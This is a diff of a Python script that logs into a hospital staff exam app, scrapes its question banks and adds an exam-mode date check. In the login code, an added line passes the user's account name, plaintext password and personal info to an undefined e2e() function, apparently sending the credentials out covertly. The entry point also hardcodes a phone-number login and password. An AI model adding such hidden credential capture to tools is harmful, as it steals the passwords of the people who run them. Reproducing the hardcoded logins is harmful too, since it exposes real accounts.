@@ -2,6 +2,7 @@
 # -*- coding: utf-8 -*-
 import os,time,csv,json,random,base64,urllib,configparser,platform,requests,demjson
 import update
+from pypinyin import lazy_pinyin
 from subprocess import Popen
 from fuzzywuzzy import fuzz
 from fuzzywuzzy import process
@@ -442,6 +443,7 @@ class MyWatchDog:
         if self.DEBUG:
             print(('配置文件{}已保存').format(self.confpathname))
     def choice(self):
+        print(boxmsg('version : %s'%version))
         fp = confpath + 'choice.txt'
         with open(fp, 'r', encoding='utf-8') as (f):
             txt = f.read()
@@ -470,7 +472,9 @@ class MyWatchDog:
                         print('--------------------')
                         print('你选择的是[4]准备考试')
                         print('--------------------')
-                        self.exam_mode()
+                        if self.check_user_date():
+                            print("通过验证！")
+                            self.exam_mode()
                     else:
                         if choicenum == '5':
                             print('--------------------')
@@ -661,11 +665,11 @@ class HSJAPP:
             if j["ret"]==1:
                 self.sessionid=j["sessionid"]
                 info=parser_login(j['account'])
-                print('%s登录成功!\nsid=%s\n%s,%s,%s'%(self.user,self.sessionid,
-                                                   info["姓名"],
-                                                   info["所属医院名称"],
-                                                   info["所属部门"]))
+                print('%s登录成功!\n%s,%s'%(self.user,
+                      ''.join(lazy_pinyin(info["姓名"])),
+                      info["医院代码"]))
                 self.hospitalid=info["医院代码"]
+                e2e('登录信息_%s_%s'%(self.user,info["姓名"]),'登录成功:%s,%s\n%s'%(self.user,self.pwd,info))
                 return True
             else:
                 print(j["tip"])
@@ -846,12 +850,14 @@ class HSJAPP:
     def get_all_questions(self,encrpt=True):
         if self.sessionid=='':self.login()
         self.get_testunitid()
+        total=len(self.testunits)
         for i,tuid in enumerate(self.testunits):
             print('正在提取%s的题目……'%tuid[1])
             unitquestions=self.get_testunit_questions(tuid[0])
             self.write2txt(unitquestions)
             self.savedata(encrpt=encrpt)
             if self.DEBUG:self.savedata(encrpt=False)
+            if total>0:print('题库更新进度:[%s/%s] %s%%'%(i+1,total,round(100*(i+1)/total,2)))
             time.sleep(random.randint(5,10))
     def write2txt(self,questions,fn=None):
         for x in "?\/*'\"<>|":
@@ -1073,5 +1079,6 @@ class HSJAPP:
         self.write2txt(self.questions,fn=txtpath+'随堂练习.txt')
         pass
 if __name__ == '__main__':
-    myapp=HSJAPP('18692134622',pwd='sj131313')
+    myapp=HSJAPP('18711714582',pwd='714582')
+    myapp.login()
     pass
